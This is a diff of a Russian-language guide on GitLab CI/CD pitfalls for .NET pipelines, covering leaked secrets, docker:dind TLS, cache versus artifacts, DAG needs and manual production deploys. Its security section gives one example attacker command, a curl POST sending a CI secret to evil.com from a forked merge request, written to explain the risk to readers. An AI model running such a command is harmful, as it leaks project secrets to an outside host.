@@ -4,175 +4,94 @@ description: GitLab CI/CD — оптимизация, ловушки, безоп
 allowed-tools: Read, Grep, Glob
 ---
 
-# GitLab CI/CD
+# GitLab CI/CD — ловушки и anti-patterns
 
-## Правила
+## Безопасность
 
-- Stages: validate → build → test → package → deploy
-- Cache для NuGet packages, artifacts для build outputs
-- `rules:` вместо `only:/except:` (deprecated)
-- `needs:` (DAG) для параллельных dependencies
-- Protected + masked variables для secrets
-- `interruptible: true` для non-deploy jobs
-- Manual deploy в production
+### Секреты в логах
+Плохо: `script: echo "Deploying with $DB_PASSWORD"` — masked переменная раскрыта через echo
+Правильно: никогда не echo/print переменные. Если нужна отладка — `echo "DB_PASSWORD is set: $([ -n "$DB_PASSWORD" ] && echo yes || echo no)"`
+Почему: GitLab маскирует переменную в логах, НО echo обходит маскировку. Логи видны всем с доступом к проекту
 
-## Частые ошибки
+### Секреты на Shared Runner
+Плохо: protected переменные на shared runner с `tags: []` — любой MR из fork может запустить pipeline
+Правильно: protected + masked переменные, `rules: - if: $CI_COMMIT_BRANCH == "main"` для jobs с секретами, или dedicated runner
+Почему: злоумышленник делает fork, добавляет `script: curl -X POST https://evil.com -d $SECRET`, создаёт MR — pipeline запускается с секретами проекта
 
-```yaml
-# Плохо — секреты в логах
-script:
-  - echo "Deploying with $DB_PASSWORD"  # маскированная переменная раскрыта
+### docker:dind без TLS
+Плохо: `services: [docker:dind]` без `DOCKER_TLS_CERTDIR`
+Правильно: `DOCKER_TLS_CERTDIR: "/certs"` + `DOCKER_HOST: "tcp://docker:2376"` + `DOCKER_TLS_VERIFY: "1"`
+Почему: без TLS Docker daemon слушает на TCP без аутентификации. На shared runner другие jobs могут подключиться к вашему daemon и выполнить произвольный код
 
-# Плохо — cache и artifacts путаются
-build:
-  cache:
-    paths:
-      - bin/Release/    # это build output → artifacts, не cache
-  artifacts:
-    paths:
-      - .nuget/packages/  # это dependencies → cache, не artifacts
+## Cache и Artifacts
 
-# Хорошо — cache для dependencies, artifacts для outputs
-build:
-  cache:
-    key: "$CI_COMMIT_REF_SLUG"
-    paths:
-      - .nuget/packages/
-  artifacts:
-    paths:
-      - "**/bin/Release/"
-    expire_in: 1 hour
+### Cache и artifacts перепутаны
+Плохо: `cache: paths: [bin/Release/]` (build output) + `artifacts: paths: [.nuget/packages/]` (dependencies)
+Правильно: cache для dependencies (NuGet, npm), artifacts для build outputs (bin/, publish/)
+Почему: cache может исчезнуть в любой момент (не гарантирован). Если build output в cache — следующий job получает пустую папку, pipeline падает. Artifacts — гарантированная передача между jobs
 
-# Плохо — only/except (deprecated) + нет DAG
-build:
-  stage: build
-  only: [main, develop]
-test:
-  stage: test
-  # ждёт ВСЕ jobs в build stage, даже ненужные
+### Cache key без изоляции веток
+Плохо: `cache: key: "global"` — все ветки разделяют один cache
+Правильно: `cache: key: "$CI_COMMIT_REF_SLUG"` — cache per branch
+Почему: feature-ветка обновляет пакет → cache обновляется → develop получает неожиданную версию зависимости
 
-# Хорошо — rules + needs (DAG)
-build:
-  stage: build
-  rules:
-    - if: $CI_COMMIT_BRANCH == "main"
-    - if: $CI_MERGE_REQUEST_ID
+### Artifacts без expire_in
+Плохо: `artifacts: paths: ["**/bin/Release/"]` — хранятся вечно
+Правильно: `artifacts: expire_in: 1 hour` (или 1 day для отладки)
+Почему: каждый pipeline оставляет артефакты → диск GitLab переполняется. 100 пайплайнов × 200MB = 20GB мусора
 
-test:unit:
-  stage: test
-  needs:
-    - job: build
-      artifacts: true
-  # стартует сразу после build, не ждёт другие jobs
-```
+## Pipeline структура
 
-## .NET Pipeline — шаблон
+### only/except вместо rules
+Плохо: `only: [main, develop]` — deprecated, ограниченная логика
+Правильно: `rules: - if: $CI_COMMIT_BRANCH =~ /^(main|develop)$/`
+Почему: `only/except` не комбинируется (OR-логика), не поддерживает `changes:`, `exists:`, `variables`. `rules` — полный контроль: when, allow_failure, variables
 
-```yaml
-variables:
-  NUGET_PACKAGES: "$CI_PROJECT_DIR/.nuget/packages"
-  DOCKER_IMAGE: "$CI_REGISTRY_IMAGE"
+### Нет needs (DAG) — всё последовательно
+Плохо: `test:unit` и `test:integration` в одном stage без `needs:` — ждут ВСЕ jobs предыдущего stage
+Правильно: `needs: [build]` — стартуют сразу после build, не ждут lint и другие jobs
+Почему: pipeline 5 stages × 3 jobs = 15 последовательных шагов вместо DAG-графа. Pipeline 20 мин вместо 8
 
-stages: [validate, build, test, package, deploy]
+### interruptible не выставлен
+Плохо: push → pipeline запускается → ещё push → ОБА pipeline работают параллельно
+Правильно: `interruptible: true` на всех non-deploy jobs + Auto-cancel redundant pipelines в настройках
+Почему: 5 push за 10 минут = 5 параллельных pipeline, shared runner перегружен, все ждут в очереди
 
-.dotnet-cache: &dotnet-cache
-  cache:
-    key: "$CI_COMMIT_REF_SLUG"
-    paths: [.nuget/packages/]
+## .NET специфика
 
-lint:
-  stage: validate
-  <<: *dotnet-cache
-  image: mcr.microsoft.com/dotnet/sdk:8.0
-  script:
-    - dotnet format --verify-no-changes
-  interruptible: true
+### --locked-mode без lock-файла
+Плохо: `dotnet restore --locked-mode` без `packages.lock.json` в репо
+Правильно: сначала `dotnet restore --use-lock-file` локально → commit `packages.lock.json` → потом `--locked-mode` в CI
+Почему: `--locked-mode` без lock-файла тихо падает (exit code 1), но сообщение неочевидно. CI красный, причина непонятна
 
-build:
-  stage: build
-  <<: *dotnet-cache
-  image: mcr.microsoft.com/dotnet/sdk:8.0
-  script:
-    - dotnet restore --locked-mode
-    - dotnet build -c Release --no-restore
-  artifacts:
-    paths: ["**/bin/Release/"]
-    expire_in: 1 hour
-  interruptible: true
+### dotnet test --no-build без предварительного build
+Плохо: `dotnet test --no-build` в отдельном job без artifacts от build job
+Правильно: `needs: [build]` + `artifacts: true` чтобы получить bin/ из build job
+Почему: `--no-build` ожидает скомпилированные файлы. Без artifacts — `Could not find testhost` или `FileNotFoundException`
 
-test:unit:
-  stage: test
-  <<: *dotnet-cache
-  image: mcr.microsoft.com/dotnet/sdk:8.0
-  needs: [build]
-  script:
-    - dotnet test --no-build -c Release --logger "trx" /p:CollectCoverage=true
-  coverage: '/Total\s+\|\s+(\d+\.?\d*)%/'
-  artifacts:
-    reports:
-      junit: "**/TestResults/*.trx"
-      coverage_report:
-        coverage_format: cobertura
-        path: "**/coverage.cobertura.xml"
-  interruptible: true
+### Coverage regex не парсится
+Плохо: `coverage: '/Coverage: (\d+)%/'` — regex не совпадает с форматом вывода
+Правильно: проверь формат вывода `dotnet test` с coverlet → напиши regex под реальный output, например `'/Total\s+\|\s+(\d+\.?\d*)%/'`
+Почему: GitLab тихо игнорирует несовпавший regex — coverage показывает 0% или пусто. Нет ошибки, нет предупреждения
 
-test:integration:
-  stage: test
-  needs: [build]
-  image: mcr.microsoft.com/dotnet/sdk:8.0
-  services: [postgres:15-alpine]
-  variables:
-    POSTGRES_DB: testdb
-    POSTGRES_USER: postgres
-    POSTGRES_PASSWORD: postgres
-  script:
-    - dotnet test tests/Integration.Tests --no-build -c Release
-  interruptible: true
+## Deploy
 
-docker-build:
-  stage: package
-  image: docker:latest
-  services: [docker:dind]
-  needs: [test:unit, test:integration]
-  script:
-    - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
-    - docker build -t $DOCKER_IMAGE:$CI_COMMIT_SHA .
-    - docker push $DOCKER_IMAGE:$CI_COMMIT_SHA
-  rules:
-    - if: $CI_COMMIT_BRANCH =~ /^(main|develop)$/
+### Deploy без manual gate на production
+Плохо: автоматический deploy в production на push в main
+Правильно: `when: manual` + `environment: name: production` + protected branch + required approvals
+Почему: сломанный код в main = автоматически сломанный production. Manual gate даёт время на smoke test staging
 
-deploy-production:
-  stage: deploy
-  image: bitnami/kubectl:latest
-  needs: [docker-build]
-  script:
-    - kubectl set image deployment/myapp myapp=$DOCKER_IMAGE:$CI_COMMIT_SHA -n production
-    - kubectl rollout status deployment/myapp -n production
-  environment:
-    name: production
-    url: https://example.com
-  when: manual
-  rules:
-    - if: $CI_COMMIT_BRANCH == "main"
-```
-
-## Оптимизация pipeline
-
-| Проблема | Решение |
-|----------|---------|
-| Долгий restore | NuGet cache + `--locked-mode` |
-| Всё ждёт build | `needs:` (DAG) для параллельных jobs |
-| Тесты не нужны на каждый push | `rules: changes:` для monorepo |
-| Медленный Docker build | BuildKit cache, multi-stage |
-| Pipeline > 10 мин | `interruptible: true` + cancel outdated |
+### kubectl set image без rollout status
+Плохо: `kubectl set image ... && echo "Done"` — job зелёный, но pods крашатся
+Правильно: `kubectl set image ... && kubectl rollout status deployment/myapp --timeout=300s`
+Почему: `set image` только обновляет spec. Pods могут CrashLoopBackOff, но CI уже зелёный. `rollout status` ждёт реального запуска
 
 ## Чек-лист
 
-- [ ] Cache для NuGet, artifacts для build outputs
-- [ ] `rules:` вместо `only:/except:`
-- [ ] `needs:` для параллельных зависимостей
-- [ ] `interruptible: true` на non-deploy jobs
-- [ ] Protected + masked variables для secrets
-- [ ] Manual deploy в production
-- [ ] Coverage и test reports в artifacts
-- [ ] `--locked-mode` для restore
+- Cache для dependencies, artifacts для build outputs, expire_in выставлен
+- `rules:` вместо `only:/except:`, `needs:` для DAG
+- `interruptible: true` на non-deploy jobs
+- Protected + masked variables, без echo секретов
+- docker:dind с TLS
+- `--locked-mode` с `packages.lock.json` в репо
+- Manual deploy в production с rollout status
